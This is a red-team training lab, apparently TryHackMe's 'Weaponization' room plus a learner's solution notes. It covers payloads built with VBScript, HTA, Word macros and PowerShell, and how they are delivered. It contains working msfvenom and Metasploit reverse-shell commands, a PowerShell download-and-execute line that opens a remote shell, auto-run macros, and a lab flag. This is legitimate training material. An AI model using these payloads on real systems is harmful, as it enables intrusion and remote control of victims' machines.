# Introduction
----

In this room, we will be discussingÂ different techniques used for weaponization.Â 

![Cyber Kill Chain phases](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/126ff098c0efeeeb8ab694a09b3359b0.png)  

What is Weaponization  

Weaponization is the second stage of the Cyber Kill Chain model. In this stage, the attacker generates and develops their own malicious code using deliverable payloads such as word documents, PDFs, etc. [[1](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html)]. The weaponization stage aims to use the malicious weapon to exploit the target machine and gain initial access.

Most organizations have WindowsÂ OSÂ running, which is going to be a likely target. An organization's environment policy often blocks downloading and executingÂ .exeÂ files to avoid security violations. Therefore, red teamers rely upon building custom payloads sent via various channels such asÂ phishingÂ campaigns,Â social engineering, browser or software exploitation, USB, or web methods.

The following graph is an example of weaponization, where a crafted custom PDF or Microsoft Office document is used to deliver a malicious payload. The custom payload is configured to connect back to the command and control environment of the red team infrastructure.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/734a353799fc9f3cd05bb7421ceedd00.png)

For more information about red team toolkits, please visit the following: aÂ [GitHub repository](https://github.com/infosecn1nja/Red-Teaming-Toolkit#Payload%20Development)Â that has it all, including initial access, payload development, delivery methods, and others.

Most organizations block or monitor the execution ofÂ .exeÂ files within their controlled environment. For that reason, red teamers rely on executing payloads using other techniques, such as built-in windows scripting technologies. Therefore, this task focuses on various popular and effective scripting techniques, including:

- The Windows Script Host (WSH)
- An HTML Application (HTA)
- Visual Basic Applications (VBA)
- PowerShellÂ (PSH)


# Deploy the Windows Machine
---

In order to follow up along with the task content and apply what is given in this room,Â you need toÂ start the attached machine by using the green Start Machine button in this task, and wait a few minutes for it to boot up.Â To access the attached machine, you can either use the split in browser view or connect through theÂ RDP.

If you prefer to connect through the Remote Desktop Protocol (RDP), first make sure you are connected to theÂ VPN. Then anÂ RDPÂ client is required to connect to the attached Windows 10 machine. You can connect using theÂ xfreerdpÂ tool, which is available on the TryHackMe AttackBox.

To connectÂ viaÂ xfreerdpÂ use the following command:


```shell-session
user@machine$ xfreerdp /v:MACHINE_IP /u:thm /p:TryHackM3 +clipboard
```

The username:Â thmÂ  and theÂ password:Â TryHackM3


# Windows Scripting Host - WSH
---

Windows Scripting Host (WSH)

Windows scripting host is a built-in Windows administration tool that runs batch files to automate and manage tasks within the operating system.

It is a Windows native engine,Â cscript.exeÂ (for command-line scripts) andÂ wscript.exeÂ (for UI scripts), which are responsible for executing various Microsoft Visual Basic Scripts (VBScript), includingÂ vbsÂ andÂ vbe. For more information about VBScript, please visitÂ [here](https://en.wikipedia.org/wiki/VBScript). It is important to note that the VBScript engine on a Windows operating system runs and executes applications with the same level of access and permission as a regular user; therefore, it is useful for the red teamers.

Now let's write a simpleÂ VBScript codeÂ to create a windows message box that shows theÂ Welcome toÂ THMÂ message. Make sure to save the following code into a file, for example,Â hello.vbs.

```javascript
Dim message 
message = "Welcome to THM"
MsgBox message
```

In the first line, we declared theÂ messageÂ variable usingÂ Dim.Â Then we store a string value ofÂ Welcome toÂ THMÂ in theÂ messageÂ variable. In the next line, we use the MsgBox function to show the content of the variable. For more information about the MsgBox function, please visitÂ [here](https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/scripting-articles/sfw6660x\(v=vs.84\)?redirectedfrom=MSDN). Then, we useÂ wscriptÂ to run and execute the content ofÂ hello.vbs.Â As a result, A Windows message will pop up withÂ theÂ Welcome toÂ THMÂ message.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/f40a7711a408932981d827bfe6e522f3.png)  

Now let's use the VBScript to run executable files. The followingÂ vbsÂ code is to invoke the Windows calculator, proof that we can executeÂ .exeÂ files using the Windows native engine (WSH).

```javascript
Set shell = WScript.CreateObject("Wscript.Shell")
shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
```

We create an object of theÂ WScriptÂ library usingÂ CreateObjectÂ to call the execution payload. Then, we utilize theÂ RunÂ method to execute the payload. For this task, we willÂ run theÂ Windows calculatorÂ calc.exe.Â 

To execute theÂ vbsÂ file, we can run it using theÂ wscriptÂ as follows,Â 


```shell-session
c:\Windows\System32>wscript c:\Users\thm\Desktop\payload.vbs
```

We can also run it viaÂ cscriptÂ as follows,


```shell-session
c:\Windows\System32>cscript.exe c:\Users\thm\Desktop\payload.vbs
```

As a result, the Windows calculator will appear on the Desktop.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/8c7cbe29ee437b83a244994621cf6996.png)  

Another trick. If the VBS files are blacklisted, then we can rename the file toÂ .txtÂ file and run it usingÂ wscriptÂ as follows,  


```shell-session
c:\Windows\System32>wscript /e:VBScript c:\Users\thm\Desktop\payload.txt
```

The result will be as exact as executing theÂ vbsÂ files, which run theÂ calc.exeÂ binary.  

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/f6d6a5f824fa64750e8b15ce6ba07a7a.png)


# An HTML Application - HTA
------

HTAÂ stands for â€œHTML Application.â€ It allows you to create a downloadable file that takes all the information regarding how it is displayed and rendered.Â HTML Applications, also known as HTAs, which are dynamicÂ HTMLÂ pages containing JScript and VBScript. The LOLBINS (Living-of-the-land Binaries) toolÂ mshtaÂ is used to executeÂ HTAÂ files. It can be executed by itself or automatically from Internet Explorer.Â 

In the following example, we will use anÂ [ActiveXObject](https://en.wikipedia.org/wiki/ActiveX)Â in our payload as proof of concept to executeÂ cmd.exe. Consider the following HTML code.

```javascript
<html>
<body>
<script>
	var c= 'cmd.exe'
	new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```

Then serve theÂ payload.htaÂ from a web server, this could be done from the attacking machine as follows,


```shell-session
user@machine$ python3 -m http.server 8090
Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/)
```

On the victim machine, visit the malicious link using Microsoft Edge,Â http://10.8.232.37:8090/payload.hta. Note that theÂ 10.8.232.37Â is the AttackBox's IP address.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/f3a719e8137e6fdca683eefbf373ea4f.png)

Once we pressÂ Run,Â theÂ payload.htaÂ gets executed, and then it will invoke theÂ cmd.exe. The following figure shows that we have successfully executed theÂ cmd.exe.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/07c5180cd36650478806a1bf3d4595f2.png)

**HTAÂ Reverse Connection**

We can create a reverse shell payload as follows,


```shell-session
user@machine$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of hta-psh file: 7692 bytes
Saved as: thm.hta
```

We use theÂ msfvenomÂ from theÂ MetasploitÂ framework to generate a malicious payload to connect back to the attacking machine. We used the following payload to connect theÂ windows/x64/shell_reverse_tcpÂ to our IP and listening port.

On the attacking machine, we need to listen to the portÂ 443Â usingÂ nc. Please note this port needs root privileges to open, or you can use different ones.

Once the victim visits the malicious URL and hits run, we get the connection back.


```shell-session
user@machine$ sudo nc -lvp 443
listening on [any] 443 ...
10.8.232.37: inverse host lookup failed: Unknown host
connect to [10.8.232.37] from (UNKNOWN) [10.10.201.254] 52910
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\thm\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\TempState\Downloads>
pState\Downloads>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet 4:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::fce4:699e:b440:7ff3%2
   IPv4 Address. . . . . . . . . . . : 10.10.201.254
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.10.0.1
```

MaliciousÂ HTAÂ viaÂ MetasploitÂ 

There is another way to generate and serve maliciousÂ HTAÂ files using theÂ MetasploitÂ framework. First, run theÂ MetasploitÂ framework usingÂ msfconsole -qÂ command.Â Under the exploit section, there isÂ exploit/windows/misc/hta_server,Â which requires selecting and setting information such asÂ LHOST,Â LPORT,Â SRVHOST,Â Payload,Â and finally, executingÂ exploitÂ to run the module.


```shell-session
msf6 > use exploit/windows/misc/hta_server
msf6 exploit(windows/misc/hta_server) > set LHOST 10.8.232.37
LHOST => 10.8.232.37
msf6 exploit(windows/misc/hta_server) > set LPORT 443
LPORT => 443
msf6 exploit(windows/misc/hta_server) > set SRVHOST 10.8.232.37
SRVHOST => 10.8.232.37
msf6 exploit(windows/misc/hta_server) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(windows/misc/hta_server) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(windows/misc/hta_server) >
[*] Started reverse TCP handler on 10.8.232.37:443
[*] Using URL: http://10.8.232.37:8080/TkWV9zkd.hta
[*] Server started.
```

On the victim machine, once we visit the maliciousÂ HTAÂ file that was provided as a URL byÂ Metasploit, we should receive a reverse connection.  


```shell-session
user@machine$ [*] 10.10.201.254    hta_server - Delivering Payload
[*] Sending stage (175174 bytes) to 10.10.201.254
[*] Meterpreter session 1 opened (10.8.232.37:443 -> 10.10.201.254:61629) at 2021-11-16 06:15:46 -0600
msf6 exploit(windows/misc/hta_server) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer        : DESKTOP-1AU6NT4
OS              : Windows 10 (10.0 Build 14393).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 3
Meterpreter     : x86/windows
meterpreter > shell
Process 4124 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\app>
```

# Visual Basic for Application - VBA
---

VBA stands for Visual Basic for Applications, a programming language by Microsoft implemented for Microsoft applications such as Microsoft Word, Excel, PowerPoint, etc. VBA programming allows automating tasks of nearly every keyboard and mouse interaction between a user and Microsoft Office applications.Â   

Macros are Microsoft Office applications that contain embedded code written in a programming language known as Visual Basic for Applications (VBA). It is used to create custom functions to speed up manual tasks by creating automated processes.Â One of VBA's features is accessing the Windows Application Programming Interface ([API](https://en.wikipedia.org/wiki/Windows_API))Â and other low-level functionality. For more information about VBA, visitÂ [here](https://en.wikipedia.org/wiki/Visual_Basic_for_Applications).Â 

In this task, we will discuss the basics of VBA and the ways the adversary uses macros to create malicious Microsoft documents. To follow up along with the content of this task, make sure to deploy the attached Windows machine in Task 2. When it is ready, it will be available through in-browser access.

Now open Microsoft Word 2016 from the Start menu. Once it is opened, we close the product key window since we will use it within the seven-day trial period.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/2ceed0307819cf06500e6524a5f632d7.png)  

Next, make sure to accept the Microsoft Office license agreement that shows after closing the product key window.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/feb2f077507c6c242658e76ee88fb544.png)

Now create a new blank Microsoft document to create our firstÂ macro. The goal is to discuss the basics of the language and show how to run it when a Microsoft Word document gets opened. First, we need to open the Visual Basic Editor by selectingÂ viewÂ â†’Â macros. The Macros window shows to create our own macro within the document.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/5e12755e9b891865c6ef07e25047060b.png)  

In theÂ Macro nameÂ section, we choose to name our macro asÂ THM. Note that we needÂ to select from theÂ Macros inÂ listÂ Document1Â and finally selectÂ create. Next, the Microsoft Visual Basic for Application editor shows where we can write VBA code. Let's try to show a message box with the following message:Â Welcome to Weaponization Room!. We can do that using theÂ MsgBoxÂ function as follows:

```javascript
Sub THM()
  MsgBox ("Welcome to Weaponization Room!")
End Sub
```

Finally, run the macro byÂ F5Â orÂ RunÂ â†’Â Run Sub/UserForm.

Now in order to execute the VBA code automatically once the document gets opened, we can use built-in functions such asÂ AutoOpenÂ andÂ Document_open.Â Note that we need to specify the function name that needs to be run once the document opens, which in our case, is theÂ THMÂ function.

```javascript
Sub Document_Open()
  THM
End Sub

Sub AutoOpen()
  THM
End Sub

Sub THM()
   MsgBox ("Welcome to Weaponization Room!")
End Sub
```

It is important to note that to make the macro work, we need to save it in Macro-Enabled format such asÂ .doc andÂ docm. Now let's save the file asÂ Word 97-2003 TemplateÂ where the Macro is enabled by going toÂ FileÂ â†’Â save Document1Â and save as type â†’Â Word 97-2003 DocumentÂ and finally,Â save.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/a5e35b7436173da709dae5695c34d4f9.png)  

Let's close the Word document that we saved.Â If we reopen the document file, Microsoft Word will show a security message indicating thatÂ Macros have been disabledÂ and give us the option to enable it. Let's enable it and move forward to check out the result.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/e140bfbce59d6cf3e71489dba094adc2.png)  

Once we allowed theÂ Enable Content, our macro gets executed as shown,

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/ca228c238732dcdf21139317992a0083.png)  

Now edit the word document and create a macro function that executes aÂ calc.exeÂ or any executable file as proof of concept as follows,  

```javascript
Sub PoC()
	Dim payload As String
	payload = "calc.exe"
	CreateObject("Wscript.Shell").Run payload,0
End Sub
```

To explain the code in detail, withÂ Dim payload As String,Â we declareÂ payloadÂ variable as a string usingÂ DimÂ keyword. WithÂ payload = "calc.exe"Â we are specifying the payload name and finally withÂ CreateObject("Wscript.Shell").Run payloadÂ we create a Windows Scripting Host (WSH) object and run the payload. Note that if you want to rename the function name, then you must include the function name in theÂ Â AutoOpen()Â andÂ Document_open()Â functions too.

Make sure to test your code before saving the document by using the running feature in the editor. Make sure to createÂ AutoOpen()Â andÂ Document_open()Â functions before saving the document. Once the code works, now save the file and try to open it again.  

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/5c80382621d3fcb578a9e128ca821e71.png)

It is important to mention that we can combine VBAs with previously covered methods, such as HTAs and WSH. VBAs/macros by themselves do not inherently bypass any detections.

Answer the questions below

Now let's create an in-memory meterpreter payload using the Metasploit framework to receive a reverse shell. First, from the AttackBox, we create our meterpreter payload usingÂ msfvenom. We need to specify theÂ Payload,Â LHOST,Â andÂ LPORT,Â which match what is in the Metasploit framework. Note that we specify the payload asÂ VBAÂ to use it as a macro.

Terminal

```shell-session
user@AttackBox$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.159.15 LPORT=443 -f vba
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 341 bytes
Final size of vba file: 2698 bytes
```

The value of theÂ LHOSTÂ in the above terminalÂ is an example of AttackBox's IP address that we used. In your case, you need to specify the IP address of your AttackBox.

**Import to note**Â that one modification needs to be done to make this work.Â  The output will be working on an MS excel sheet. Therefore, change theÂ Workbook_Open()Â toÂ Document_Open()Â to make it suitable for MS word documents.

Now copy the output and save it into the macro editor of the MS word document, as we showed previously.

From the attacking machine, run the Metasploit framework and set the listener as follows:

Terminal

```shell-session
user@AttackBox$ msfconsole -q
msf5 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 10.50.159.15
LHOST => 10.50.159.15
msf5 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf5 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 10.50.159.15:443 
```

Once the malicious MS word document is opened on the victim machine, we should receive a reverse shell.

Terminal

```shell-session
msf5 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 10.50.159.15:443 
[*] Sending stage (176195 bytes) to 10.10.215.43
[*] Meterpreter session 1 opened (10.50.159.15:443 -> 10.10.215.43:50209) at 2021-12-13 10:46:05 +0000
meterpreter >
```

Now replicate and apply what we discussed to get a reverse shell!


# PowerShell (PSH)
---

PowerShellÂ is an object-oriented programming language executed from the Dynamic Language Runtime (DLR) inÂ .NETÂ with some exceptions for legacy uses. Check out the TryHackMe room,Â [Hacking withÂ PowerShellÂ for more information aboutÂ PowerShell](https://tryhackme.com/room/powershell).  

Red teamers rely onÂ PowerShellÂ in performing various activities, including initial access, system enumerations, and many others.Â Let's start by creating a straightforwardÂ PowerShellÂ script that prints "Welcome to the Weaponization Room!" as follows,

```powershell
Write-Output "Welcome to the Weaponization Room!"
```

Save the file asÂ thm.ps1.Â With theÂ Write-Output, we print the message "Welcome to the Weaponization Room!" to the command prompt.Â Now let's run it and see the result.

CMD

```shell-session
C:\Users\thm\Desktop>powershell -File thm.ps1
File C:\Users\thm\Desktop\thm.ps1 cannot be loaded because running scripts is disabled on this system. For more
information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170.
    + CategoryInfo          : SecurityError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : UnauthorizedAccess

C:\Users\thm\Desktop>
```

Execution Policy

PowerShell's execution policy is aÂ security optionÂ to protect the system from running malicious scripts. By default, Microsoft disables executingÂ PowerShellÂ scriptsÂ .ps1Â for security purposes. TheÂ PowerShellÂ execution policy is set toÂ Restricted, which means it permits individual commands but not run any scripts.  

You can determine the currentÂ PowerShellÂ setting of your Windows as follows,

CMD

```shell-session
PS C:\Users\thm> Get-ExecutionPolicy
Restricted
```

We can also easily change theÂ PowerShellÂ execution policy by running:

CMD

```shell-session
PS C:\Users\thm\Desktop> Set-ExecutionPolicy -Scope CurrentUser RemoteSigned

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic at
http://go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes [A] Yes to All [N] No [L] No to All [S] Suspend [?] Help (default is "N"): A
```

Bypass Execution Policy

Microsoft provides ways to disable this restriction. One of these ways is by giving an argument option to theÂ PowerShellÂ command to change it to your desired setting. For example, we can change it toÂ bypassÂ policy which means nothing is blocked or restricted. This is useful since that lets us run our ownÂ PowerShellÂ scripts.  

In order to make sure ourÂ PowerShellÂ file gets executed, we need to provide the bypass option in the arguments as follows,

CMD

```shell-session
C:\Users\thm\Desktop>powershell -ex bypass -File thm.ps1
Welcome to Weaponization Room!
```

Now, let's try to get a reverse shell using one of the tools written in PowerShell, which is powercat. On your AttackBox, download it from GitHub and run a webserver to deliver the payload.  

Terminal

```shell-session
user@machine$ git clone https://github.com/besimorhino/powercat.git
Cloning into 'powercat'...
remote: Enumerating objects: 239, done.
remote: Counting objects: 100% (4/4), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 239 (delta 0), reused 2 (delta 0), pack-reused 235
Receiving objects: 100% (239/239), 61.75 KiB | 424.00 KiB/s, done.
Resolving deltas: 100% (72/72), done.
```

Now, we need to set up a web server on that AttackBox to serve theÂ powercat.ps1 that will be downloaded and executed on the target machine. Next, change the directory to powercat and start listening on a port of your choice. In our case, we will be using portÂ 8080.

Terminal

```shell-session
user@machine$ cd powercat
user@machine$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

On the AttackBox, we need to listen on portÂ 1337Â usingÂ ncÂ to receive the connection back from the victim.

Terminal

```shell-session
user@machine$ nc -lvp 1337
```

Now, from the victim machine, we download the payload and execute it usingÂ PowerShellÂ payload as follows,

Terminal

```shell-session
C:\Users\thm\Desktop> powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd"
```

Now that we have executed the command above, the victim machine downloads theÂ powercat.ps1Â Â payload from our web server (on the AttackBox) and then executes it locally on the target usingÂ cmd.exeÂ and sends a connection back to the AttackBox that is listening on portÂ 1337. After a couple of seconds, we should receive the connection call back:

Terminal

```shell-session
user@machine$ nc -lvp 1337  listening on [any] 1337 ...
10.10.12.53: inverse host lookup failed: Unknown host
connect to [10.8.232.37] from (UNKNOWN) [10.10.12.53] 49804
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Users\thm>
```

# Command And Control - (C2 Or C&C)
---

This task introduces the basic concept of Command and Control (C2) frameworks used in Red team operations.

  

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/9671adc6cb778fa7b151921f753e2f96.jpg)

What is Command and Control (C2)?

C2Â frameworks are post-exploitation frameworks that allow red teamers to collaborate and control compromised machines.Â C2Â is considered one of the most important tools for red teamers during offensive cyber operations.Â C2Â frameworks provide fast and straightforward approaches to:

- Generate various malicious payloads
- Enumerate the compromised machine/networks
- Perform privilege escalation and pivoting
- Lateral movementÂ 
- And many others

  

Some popularÂ C2Â frameworks that we'll briefly highlight are Cobalt Strike,Â PowerShellÂ Empire,Â Metasploit. Most of these frameworks aim to support a convenient environment to share and communicateÂ between red team operations once the initial access is gained to a system.

  

### Cobalt Strike

Cobalt Strike is a commercial framework that focuses on Adversary Simulations and Red Team Operations. It is a combination of remote access tools, post-exploitation capabilities, and a unique reporting system. It provides an agent with advanced techniques to establish covert communications and perform various operations,Â including key-logging, files upload and download,Â VPNÂ deployment, privilege escalation techniques, mimikatz, port scanning, and the most advanced lateral movements.  

### PowerShellÂ Empire

PowerShellÂ Empire is an open-source framework that helps red team operators and pen testers collaborate across multiple servers using keys and shared passwords. It is an exploitation framework based onÂ PowerShellÂ and Python agents.Â PowerShellÂ Empire focuses on client-side and post-exploitation of Windows and Active Directory environment.Â If you want to learn more aboutÂ PowerShellÂ Empire, we suggest trying out this room:Â [Empire](https://tryhackme.com/room/rppsempire).

### MetasploitÂ 

MetasploitÂ is a widely used exploitation framework that offers various techniques and tools to perform hacking easily. It is an open-source framework and is considered one of the primary tools for pentesting and red team operations.Â MetasploitÂ is one of the tools we use in this room to generate payload for our weaponization stage.Â If you want to learn more about theÂ MetasploitÂ framework, we suggest checking theÂ [MetasploitÂ module](https://tryhackme.com/module/metasploit).

Most of theÂ C2Â frameworks use the techniques mentioned in this room as preparation for the initial access stage. For more details about theÂ C2Â framework, we invite you to check theÂ [Intro toÂ C2](https://tryhackme.com/room/introtoc2)Â room.

# Delivery Techniques
---

### Delivery Techniques  

Delivery techniques are one of the important factors for getting initial access. They have to look professional, legitimate, and convincing to the victim in order to follow through with the content.

![Emails being sent from a computer](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/54108dbd9d1c3d64fb86f2ad04b5949e.png)  

  

### Email Delivery  

It is a common method to use in order to send the payload by sending aÂ phishingÂ email with a link or attachment. For more info, visitÂ [here](https://attack.mitre.org/techniques/T1566/001/). This method attaches a malicious file that could be the type we mentioned earlier. The goal is to convince the victim to visit a malicious website or download and run the malicious file to gain initial access to the victim's network or host.

The red teamers should have their own infrastructure forÂ phishingÂ purposes. Depending on the red team engagement requirement, it requires setting up various options within the email server, including DomainKeys Identified Mail (DKIM), Sender Policy Framework (SPF), andÂ DNSÂ Pointer (PTR) record.

The red teamers could also use third-party email services such as Google Gmail, Outlook, Yahoo, and others with good reputations.

Another interesting method would be to use a compromised email account within a company to sendÂ phishingÂ emails within the company or to others. The compromised email could be hacked byÂ phishingÂ or by other techniques such as password spraying attacks.

![A laptop connected with various devices and networks](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/08a3f660501cf5171277534e40aa96b8.png)  

### Web Delivery  

Another method is hosting malicious payloads on a web server controlled by the red teamers. The web server has to follow the security guidelines such as a clean record and reputation of its domain name and TLS (Transport Layer Security) certificate. For more information, visitÂ [here](https://attack.mitre.org/techniques/T1189/).

This method includes other techniques such asÂ social engineeringÂ the victim to visit or download the malicious file. A URL shortener could be helpful when using this method.

In this method, other techniques can be combined and used. The attacker can take advantage of zero-day exploits such as exploiting vulnerable software like Java or browsers to use them inÂ phishingÂ emails or web delivery techniques to gain access to the victim machine.

![A laptop and a smartphone with a USB cable](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/ff8ca3c104fa32e30603ecf97ee0d72e.png)  

### USB Delivery  

This method requires the victim to plug in the malicious USB physically. This method could be effective and useful at conferences or events where the adversary can distribute the USB. For more information about USB delivery, visitÂ [here](https://attack.mitre.org/techniques/T1091/).

Often, organizations establish strong policies such as disabling USB usage within their organization environment for security purposes. While other organizations allow it in the target environment.

Common USB attacks used to weaponize USB devices includeÂ [Rubber Ducky](https://shop.hak5.org/products/usb-rubber-ducky-deluxe)Â andÂ [USBHarpoon](https://www.minitool.com/news/usbharpoon.html), chargingÂ USB cable, such asÂ [O.MG Cable](https://shop.hak5.org/products/omg-cable).

# Practice Arena
---

We have prepared a Windows 10 machine that runs a user simulation web app to execute your payloads or visit the maliciousÂ HTAÂ links automatically.Â Deploy the attached machine and wait a couple of minutes until it's up and running. Then, visit the user simulator web application atÂ http://10.10.158.41:8080/.

Make sure to visit the user simulator web application from the AttackBox, or you can access it by connecting to theÂ VPN.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/d92b185b39570d4740e6f6a8e905124a.png)  

The web application allows uploading payloads as VBS, DOC, PS1 files. In addition, if you provide a maliciousÂ HTAÂ link, the web application will visit your link.

**Note for Doc files**: the simulation used in the provided Windows 10 machine will open the malicious Word document andÂ be closed within 90 seconds. In order to get longer prescience, you need to migrate as soon as you receive the connection back.Â 

In theÂ MetasploitÂ framework,Â we can inject our current process into another process on the victim machine usingÂ migrate. In our case, we need to migrate our current process, which is the MS word document, into another process to make the connection stable even if the MS word document is closed. The easiest way to do this is by usingÂ migrateÂ post-module as follow,


```shell-session
meterpreter > run post/windows/manage/migrate 

[*] Running module against DESKTOP-1AU6NT4
[*] Current server process: svchost.exe (3280)
[*] Spawning notepad.exe process to migrate into
[*] Spoofing PPID 0
[*] Migrating into 4960
[+] Successfully migrated into process 4960
```

In this task, the goal is to generate a reverse shell payload of your choice and send it through the web application. Once the web application runs your payload, you should receive a connect back. Answer the question below and prove your access by finding the flag once you receive a reverse shell.

For reference, you can use the MSFVenom Cheat Sheet on thisÂ [website](https://web.archive.org/web/20220607215637/https://thedarksource.com/msfvenom-cheat-sheet-create-metasploit-payloads/).


### Practical
---

Let's go with the `HTA` version:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.136.34 LPORT=443 -f hta-psh -o thm.hta
```

Once we generate the `.hta` file, we can do:

```
sudo nc -lvnp 443
```


Now, let's go to the target site:

```
http://10.10.118.217:8080/
```


We need to start a python server to be able to host the file, once we start the file, we can download it into the target machine with:

![Pasted image 20250512151130.png](../../../IMAGES/Pasted%20image%2020250512151130.png)

Make sure to change `IP` to your `tun0` ip, once it downloads, it will automatically execute in our listener:

![Pasted image 20250512151205.png](../../../IMAGES/Pasted%20image%2020250512151205.png)
As seen, we get a shell as `desktop-1au6nt4\thm`, let's read our flag:

```
C:\Users\thm\Desktop>type flag.txt

THM{b4dbc2f16afdfe9579030a929b799719}
```
